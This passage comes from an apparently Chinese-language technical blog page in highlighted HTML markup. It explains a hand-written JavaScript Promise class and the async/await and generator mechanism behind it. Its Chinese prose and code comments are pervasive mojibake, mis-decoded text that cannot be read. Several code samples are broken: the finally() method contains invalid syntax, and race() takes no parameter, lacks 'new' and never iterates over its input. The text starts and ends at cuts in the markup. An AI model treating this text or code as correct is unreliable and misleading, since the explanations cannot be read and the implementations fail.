å‚¨å­˜thenå›è°ƒreturnçš„å€¼</span></span><br><span class="line">    <span class="keyword">this</span>._resolveQueue = []    <span class="comment">// æˆåŠŸé˜Ÿåˆ—, resolveæ—¶è§¦å‘</span></span><br><span class="line">    <span class="keyword">this</span>._rejectQueue = []     <span class="comment">// å¤±è´¥é˜Ÿåˆ—, rejectæ—¶è§¦å‘</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _resolve = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>   <span class="comment">// å¯¹åº”è§„èŒƒä¸­çš„"çŠ¶æ€åªèƒ½ç”±pendingåˆ°fulfilledæˆ–rejected"</span></span><br><span class="line">        <span class="keyword">this</span>._status = FULFILLED              <span class="comment">// å˜æ›´çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">this</span>._value = val                     <span class="comment">// å‚¨å­˜å½“å‰value</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// thenå¯ä»¥è¢«åŒä¸€ä¸ª promise è°ƒç”¨å¤šæ¬¡ï¼Œå› æ­¤ä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—æ¥å‚¨å­˜å›è°ƒ</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>._resolveQueue.length) &#123;    </span><br><span class="line">          <span class="keyword">const</span> callback = <span class="keyword">this</span>._resolveQueue.shift()</span><br><span class="line">          callback(val)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// æ— è®ºresolveæ˜¯è¢«åŒæ­¥ä»£ç ï¼Œè¿˜æ˜¯å¼‚æ­¥ä»£ç ï¼Œéƒ½æ”¾åœ¨setTimeoutä¸­ä¿è¯å»¶è¿Ÿè°ƒç”¨</span></span><br><span class="line">      setTimeout(run)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _reject = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>   <span class="comment">// å¯¹åº”è§„èŒƒä¸­çš„"çŠ¶æ€åªèƒ½ç”±pendingåˆ°fulfilledæˆ–rejected"</span></span><br><span class="line">        <span class="keyword">this</span>._status = REJECTED               <span class="comment">// å˜æ›´çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">this</span>._value = val                     <span class="comment">// å‚¨å­˜å½“å‰value</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>._rejectQueue.length) &#123;</span><br><span class="line">          <span class="keyword">const</span> callback = <span class="keyword">this</span>._rejectQueue.shift()</span><br><span class="line">          callback(val)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      setTimeout(run)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// new Promise()æ—¶ç«‹å³æ‰§è¡Œexecutor</span></span><br><span class="line">    executor(_resolve, _reject)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// thenæ”¶é›†æˆåŠŸå›è°ƒ å’Œ å¤±è´¥å›è°ƒ</span></span><br><span class="line">  then(resolveFn, rejectFn) &#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®è§„èŒƒï¼Œå¦‚æœthençš„å‚æ•°ä¸æ˜¯functionï¼Œåˆ™å¿½ç•¥å®ƒ, è®©é“¾å¼è°ƒç”¨ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">typeof</span> resolveFn !== <span class="string">'function'</span> ? resolveFn = <span class="function"><span class="params">value</span> =&gt;</span> value : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">typeof</span> rejectFn !== <span class="string">'function'</span> ? rejectFn = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(reason <span class="keyword">instanceof</span> <span class="built_in">Error</span>? reason.message:reason);</span><br><span class="line">    &#125; : <span class="literal">null</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// thenæ€»æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„promise</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> fulfilledFn = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> x = resolveFn(value)</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          ä¹‹å‰ä¸€ç›´ä¸äº†è§£ ä¸ºä»€ä¹ˆå¦‚æœxæ˜¯promiseï¼Œå°±éœ€è¦æ‰§è¡Œx.then()ï¼Œè‹¦æƒ³ä¸€æ®µæ—¶é—´åæœ‰ç‚¹ä½“ä¼šï¼š</span></span><br><span class="line"><span class="comment">  åœ¨è¿™é‡Œåªè®¨è®º p1.then(() =&gt; &#123; return new Promise() &#125;).then() çš„æƒ…å†µ</span></span><br><span class="line"><span class="comment">  é¦–å…ˆ ç¬¬ä¸€ä¸ª .then() å†…éƒ¨é»˜è®¤ä¼šè¿”å›ä¸€ä¸ªpromiseï¼Œå«åšpromiseAï¼Œå¼€å‘è€…å¦‚æœæœ‰éœ€æ±‚åˆ™ä¼šæ‰‹åŠ¨returnä¸€ä¸ª æ–°çš„ promiseï¼Œå«åš promiseBï¼Œä¹Ÿå°±æ˜¯ä¸Šæ–‡çš„ x ã€‚</span></span><br><span class="line"><span class="comment">  ç¬¬äºŒä¸ª.then()çš„å›è°ƒå‡½æ•°å‚æ•°å®é™…ä¸Šåº”è¯¥è·å–åˆ°çš„æ˜¯å¼€å‘è€…å†™çš„ promiseB(ä¹Ÿå°±æ˜¯x) çš„æ‰§è¡Œç»“æœï¼Œä½†æ˜¯ç”±äºé»˜è®¤è¿”å›ä¸€ä¸ªpromiseAï¼Œåˆ™ç¬¬äºŒä¸ª.then()çš„å›è°ƒå‡½æ•°å‚æ•°æ˜¯ promiseA çš„æ‰§è¡Œç»“æœ.ã€‚ </span></span><br><span class="line"><span class="comment">  å› æ­¤æƒ³è¦ç¬¬äºŒä¸ª.then()è·å–åˆ°çš„ç»“æœæ˜¯æ­£ç¡®çš„ç»“æœï¼Œå°±éœ€è¦å…ˆæ‰§è¡Œ promiseBï¼Œå†æŠŠ promiseB çš„ç»“æœä¸¢åˆ°promiseAã€‚</span></span><br><span class="line"><span class="comment">  å› æ­¤åœ¨å¾—åˆ° x ä¸º promise çš„æ—¶å€™ï¼Œå…ˆæ‰§è¡Œ x.then(resolve) ï¼Œè¿™ä¸ªå½¢å‚ resolve æ˜¯ promiseA çš„ resolveå‡½æ•° ï¼Œ ç­‰åˆ° x ï¼ˆpromiseBï¼‰ çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œthenæ”¶é›†åˆ°çš„å›è°ƒï¼Œå³ä¼šæ‰§è¡Œ A çš„ resolve å‡½æ•°ï¼Œè€Œ x.then çš„å›è°ƒå‡½æ•°çš„å‚æ•°å°±æ˜¯ promiseA çš„ resolveå‡½æ•°çš„å‚æ•°ã€‚è¿™æ ·å°±æŠŠ x ï¼ˆpromiseBï¼‰çš„æ‰§è¡Œç»“æœé€šè¿‡.thenå›è°ƒä¼ é€’åˆ°äº† promiseAï¼Œç„¶åé€šè¿‡ promiseA çš„ resolve å‡½æ•°ä¼ é€’åˆ°äº†ç¬¬äºŒä¸ª.then()ã€‚</span></span><br><span class="line"><span class="comment">  ä¸ªäººè®¤ä¸ºè¿™ä¸ªæ–¹æ³•çš„å·§å¦™ä¹‹å¤„åœ¨äº å°† promiseA çš„çš„ resolve ä½œä¸º x ï¼ˆpromiseBï¼‰çš„thenå›è°ƒï¼Œè€Œthenå›è°ƒçš„å‚æ•°æ­£æ˜¯ xï¼ˆpromiseBï¼‰çš„æ‰§è¡Œç»“æœï¼Œè¿™æ ·å°±æŠŠæ•°æ®ä¼ é€’äº†èµ·æ¥ã€‚</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          x <span class="keyword">instanceof</span> MyPromise ? x.then(resolve, reject) : resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          reject(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">const</span> rejectedFn  = <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> x = rejectFn(error)</span><br><span class="line">          x <span class="keyword">instanceof</span> MyPromise ? x.then(resolve, reject) : resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          reject(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">switch</span> (<span class="keyword">this</span>._status) &#123;</span><br><span class="line">        <span class="comment">// å½“çŠ¶æ€ä¸ºpendingæ—¶,æŠŠthenå›è°ƒpushè¿›resolve/rejectæ‰§è¡Œé˜Ÿåˆ—,ç­‰å¾…æ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">case</span> PENDING:</span><br><span class="line">          <span class="keyword">this</span>._resolveQueue.push(fulfilledFn)</span><br><span class="line">          <span class="keyword">this</span>._rejectQueue.push(rejectedFn)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// å½“çŠ¶æ€å·²ç»å˜ä¸ºresolve/rejectæ—¶,ç›´æ¥æ‰§è¡Œthenå›è°ƒ</span></span><br><span class="line">        <span class="keyword">case</span> FULFILLED:</span><br><span class="line">          fulfilledFn(<span class="keyword">this</span>._value)    <span class="comment">// this._valueæ˜¯ä¸Šä¸€ä¸ªthenå›è°ƒreturnçš„å€¼</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> REJECTED:</span><br><span class="line">          rejectedFn(<span class="keyword">this</span>._value)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-3-Promise-API"><a href="#1-3-Promise-API" class="headerlink" title="1.3 Promise API"></a>1.3 Promise API</h4><ul><li><p>Promise.prototype.catch()<br>è®¾ç½®Promiseçš„å¤±è´¥å›è°ƒ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (rejectFn) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="literal">undefined</span>, rejectFn)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.prototype.finally()<br>åœ¨promiseç»“æŸæ—¶ï¼Œæ— è®ºç»“æœæ˜¯fulfilledæˆ–è€…æ˜¯rejectedï¼Œéƒ½ä¼šæ‰§è¡ŒæŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span> (callback) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">    value =&gt; callback().then(())</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.resolve()<br>è¿”å›ä¸€ä¸ªç»™å®šå€¼resolveåçš„promiseå¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> resolve (value) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise) <span class="keyword">return</span> value</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(value))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.reject()<br>è¿”å›ä¸€ä¸ªå¸¦æœ‰æ‹’ç»åŸå› çš„Promiseå¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> reject (reason) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(reason))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.all()<br>æ‰€æœ‰promiseéƒ½å®Œæˆ(resolved)æ—¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> all (promiseArr) &#123;</span><br><span class="line">  <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> result = []</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    promiseArr.forEach(<span class="function">(<span class="params">p, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// Promise.resolve(p)ç”¨äºå¤„ç†ä¼ å…¥åªä¸ä¸ºpromiseçš„æƒ…å†µ</span></span><br><span class="line">      MyPromise.resolve(p).then(</span><br><span class="line">        val =&gt; &#123;</span><br><span class="line">          index++</span><br><span class="line">          result[i] = val</span><br><span class="line">          <span class="keyword">if</span> (index === promiseArr.length) &#123;</span><br><span class="line">            resolve(result)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        err =&gt; &#123;</span><br><span class="line">          reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.race()<br>ä¸€æ—¦æŸä¸ªpromise resolveæˆ–rejectï¼Œè¿”å›çš„promiseå°±ä¼šresolveæˆ–reject</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> race () &#123;</span><br><span class="line">  <span class="keyword">return</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    MyPromise.resolve(p).then(</span><br><span class="line">      value =&gt; &#123; resolve(value )&#125;,</span><br><span class="line">      err =&gt; &#123; reject(err) &#125;</span><br><span class="line">    )</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-async-await"><a href="#2-async-await" class="headerlink" title="2. async/await"></a>2. async/await</h3><p>æä¾›äº†åœ¨ä¸é˜»å¡ä¸»çº¿ç¨‹çš„æƒ…å†µä¸‹ä½¿ç”¨åŒæ­¥ä»£ç å®ç°å¼‚æ­¥è®¿é—®èµ„æºçš„èƒ½åŠ›ï¼Œå¹¶ä¸”ä½¿å¾—ä»£ç é€»è¾‘æ›´åŠ æ¸…æ™°ï¼Œè€Œä¸”è¿˜æ”¯æŒ try-catch æ¥æ•è·å¼‚å¸¸ï¼Œéå¸¸ç¬¦åˆäººçš„çº¿æ€§æ€ç»´ã€‚</p><h4 id="2-1-async-awaitè§£å†³äº†ä»€ä¹ˆé—®é¢˜"><a href="#2-1-async-awaitè§£å†³äº†ä»€ä¹ˆé—®é¢˜" class="headerlink" title="2.1  async/awaitè§£å†³äº†ä»€ä¹ˆé—®é¢˜"></a>2.1  async/awaitè§£å†³äº†ä»€ä¹ˆé—®é¢˜</h4><ul><li>è¿‡å¤šçš„é“¾å¼è°ƒç”¨å¯è¯»æ€§ä¾ç„¶ä¸ä½³</li><li>æµç¨‹æ§åˆ¶ä¸æ–¹ä¾¿<br>å¼‚æ­¥ä»»åŠ¡a-&gt;b-&gt;cä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡thené“¾å¼è°ƒç”¨æ¥å¤„ç†è¿™äº›å…³ç³»ï¼Œå¯è¯»æ€§å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ§åˆ¶æŸäº›æ¡ä»¶ä¸‹ï¼Œbä¸å¾€ä¸‹æ‰§è¡Œåˆ°cï¼Œé‚£ä¹Ÿä¸æ˜¯å¾ˆæ–¹ä¾¿æ§åˆ¶ã€‚ä½†æ˜¯å¦‚æœç”¨async/awaitæ¥å®ç°è¿™ä¸ªåœºæ™¯ï¼Œå¯è¯»æ€§å’Œæµç¨‹æ§åˆ¶éƒ½ä¼šæ–¹ä¾¿ä¸å°‘ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(a)</span><br><span class="line">  .then(<span class="function"><span class="params">b</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(a);</span><br><span class="line">  <span class="keyword">const</span> b = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(b);</span><br><span class="line">  <span class="keyword">const</span> c = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(c);</span><br><span class="line">&#125;ã€‚</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-1-Generatoræš‚åœæ¢å¤æ‰§è¡ŒåŸç†"><a href="#2-1-Generatoræš‚åœæ¢å¤æ‰§è¡ŒåŸç†" class="headerlink" title="2.1  Generatoræš‚åœæ¢å¤æ‰§è¡ŒåŸç†"></a>2.1  Generatoræš‚åœæ¢å¤æ‰§è¡ŒåŸç†</h4><p>async/awaitå®é™…ä¸Šæ˜¯å¯¹Generatorï¼ˆç”Ÿæˆå™¨ï¼‰çš„å°è£…ï¼Œæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå¹¶å¯¹Generatorè¿›è¡Œäº†æ”¹è¿›ã€‚</p><p>Generator å‡½æ•°æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼Œå°è£…äº†å¤šä¸ªå†…éƒ¨çŠ¶æ€ã€‚æ‰§è¡Œ Generator å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œå¯ä»¥ä¾æ¬¡éå† Generator å‡½æ•°å†…éƒ¨çš„æ¯ä¸€ä¸ªçŠ¶æ€ï¼Œä½†æ˜¯åªæœ‰è°ƒç”¨nextæ–¹æ³•æ‰ä¼šéå†ä¸‹ä¸€ä¸ªå†…éƒ¨çŠ¶æ€ï¼Œæ‰€ä»¥å…¶å®æä¾›äº†ä¸€ç§å¯ä»¥æš‚åœæ‰§è¡Œçš„å‡½æ•°ã€‚yieldè¡¨è¾¾å¼å°±æ˜¯æš‚åœæ ‡å¿—ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">helloWorldGenerator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'hello'</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">'world'</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'ending'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hw = helloWorldGenerator();</span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'hello', done: false &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'world', done: false &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: 'ending', done: true &#125;</span></span><br><span class="line">hw.next()<span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><h4 id="2-2-async-awaitå®ç°åŸç†"><a href="#2-2-async-awaitå®ç°åŸç†" class="headerlink" title="2.2 async/awaitå®ç°åŸç†"></a>2.2 async/awaitå®ç°åŸç†</h4><p>asyncå‡½æ•°å¯¹ Generator å‡½æ•°çš„æ”¹è¿›ï¼Œä½“ç°åœ¨ä»¥ä¸‹å››ç‚¹ï¼š</p><ul><li>å†…ç½®æ‰§è¡Œå™¨ã€‚Generator å‡½æ•°çš„æ‰§è¡Œå¿…é¡»ä¾é æ‰§è¡Œå™¨ï¼Œè€Œ async å‡½æ•°è‡ªå¸¦æ‰§è¡Œå™¨ï¼Œæ— éœ€æ‰‹åŠ¨æ‰§è¡Œ next() æ–¹æ³•ã€‚</li><li>æ›´å¥½çš„è¯­ä¹‰ã€‚asyncå’Œawaitï¼Œæ¯”èµ·æ˜Ÿå·å’Œyieldï¼Œè¯­ä¹‰æ›´æ¸…æ¥šäº†ã€‚asyncè¡¨ç¤ºå‡½æ•°é‡Œæœ‰å¼‚æ­¥æ“ä½œï¼Œawaitè¡¨ç¤ºç´§è·Ÿåœ¨åé¢çš„è¡¨è¾¾å¼éœ€è¦ç­‰å¾…ç»“æœã€‚</li><li>æ›´å¹¿çš„é€‚ç”¨æ€§ã€‚coæ¨¡å—çº¦å®šï¼Œyieldå‘½ä»¤åé¢åªèƒ½æ˜¯ Thunk å‡½æ•°æˆ– Promise å¯¹è±¡ï¼Œè€Œasyncå‡½æ•°çš„awaitå‘½ä»¤åé¢ï¼Œå¯ä»¥æ˜¯ Promise å¯¹è±¡å’ŒåŸå§‹ç±»å‹çš„å€¼ï¼ˆæ•°å€¼ã€å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼ï¼Œä½†è¿™æ—¶ä¼šè‡ªåŠ¨è½¬æˆç«‹å³ resolved çš„ Promise å¯¹è±¡ï¼‰ã€‚</li><li>è¿”å›å€¼æ˜¯ Promiseã€‚async å‡½æ•°è¿”å›å€¼æ˜¯ Promise å¯¹è±¡ï¼Œæ¯” Generator å‡½æ•°è¿”å›çš„ Iterator å¯¹è±¡æ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ then() æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰äº†ä¸€ä¸ªpromiseï¼Œç”¨æ¥æ¨¡æ‹Ÿå¼‚æ­¥è¯·æ±‚ï¼Œä½œç”¨æ˜¯ä¼ å…¥å‚æ•°++</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNum</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            resolve(num+<span class="number">1</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªåŠ¨æ‰§è¡Œå™¨ï¼Œå¦‚æœä¸€ä¸ªGeneratorå‡½æ•°æ²¡æœ‰æ‰§è¡Œå®Œï¼Œåˆ™é€’å½’è°ƒç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asyncFun</span>(<span class="params">func</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> gen = func();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = gen.next(data);</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line">    result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">      next(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰€éœ€è¦æ‰§è¡Œçš„Generatorå‡½æ•°ï¼Œå†…éƒ¨çš„æ•°æ®åœ¨æ‰§è¡Œå®Œæˆä¸€æ­¥çš„promiseä¹‹åï¼Œå†è°ƒç”¨ä¸‹ä¸€æ­¥</span></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> getNum(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> getNum(f1);</span><br><span class="line">  <span class="built_in">console</span>.log(f2) ;</span><br><span class="line">&#125;;</span><br><span class="line">asyncFun(func);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-async-awaitä¼˜ç‚¹"><a href="#2-3-async-awaitä¼˜ç‚¹" class="headerlink" title="2.3 async/awaitä¼˜ç‚¹"></a>2.3 async/awaitä¼˜ç‚¹</h4><ul><li>åšåˆ°äº†çœŸæ­£çš„ä¸²è¡ŒåŒæ­¥å†™æ³•</li><li>å¯¹æ¡ä»¶è¯­å¥å’Œå…¶ä»–æµç¨‹è¯­å¥æ¯”è¾ƒå‹å¥½ï¼Œå¯ä»¥ç›´æ¥å†™åˆ°åˆ¤æ–­æ¡ä»¶é‡Œ<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> a() === <span class="number">2</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-4-async-awaitç¼ºç‚¹"><a href="#2-4-async-awaitç¼ºç‚¹" class="headerlink" title="2.4 async/awaitç¼ºç‚¹"></a>2.4 async/awaitç¼ºç‚¹</h4><ul><li>async awaitæ˜¯æœ‰ä¼ æŸ“æ€§çš„ â€”â€” å½“ä¸€ä¸ªå‡½æ•°å˜ä¸ºasyncåï¼Œè¿™æ„å‘³ç€è°ƒç”¨ä»–çš„å‡½æ•°ä¹Ÿéœ€è¦æ˜¯asyncã€‚</li><li><p>æ— æ³•å¤„ç†promiseè¿”å›çš„rejectå¯¹è±¡ï¼Œ<code>await g()</code>ä¼šç›´æ¥æŠ¥é”™ï¼Œå¿…é¡»ç”¨tryâ€¦catchæ•è·</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 